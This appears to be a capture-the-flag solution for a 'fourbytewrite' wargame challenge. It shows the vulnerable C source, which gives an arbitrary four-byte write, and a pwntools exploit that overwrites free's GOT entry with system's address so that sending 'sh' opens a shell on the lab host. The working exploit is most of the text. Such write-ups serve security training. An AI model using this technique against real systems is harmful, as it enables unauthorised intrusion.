# SOLUTION

The source code is as follows:

```c
    system("/usr/games/cowsay \"Can you find the shell?\"");

    char * cow_buffer = malloc(12);
    memset(cow_buffer, 0, 12);
    read(0, cow_buffer, 12);
    void * ptr;

    memcpy(&ptr, cow_buffer + 4, 4);
    memcpy(ptr, cow_buffer + 8, 4);

    free(cow_buffer);
```

It gives you an arbitrary four byte write to any four byte address. Note that
this is a 64 bit binary so pointers are 8 bytes.

The solution script:

```py
#!/usr/bin/python

from pwn import *


system_plt = 0x400650
free_got = 0x601018

def main():
    #p = process("./fourbytewrite")
    p = remote("wargame", 31340)
    p.clean()
    payload  = ''
    payload += "sh\x00\x00"
    payload += p32(free_got)
    payload += p32(system_plt)
    p.send(payload)


    log.success("Enjoy your shell")
    p.clean()
    p.interactive()

if __name__ == "__main__":
    main()
```
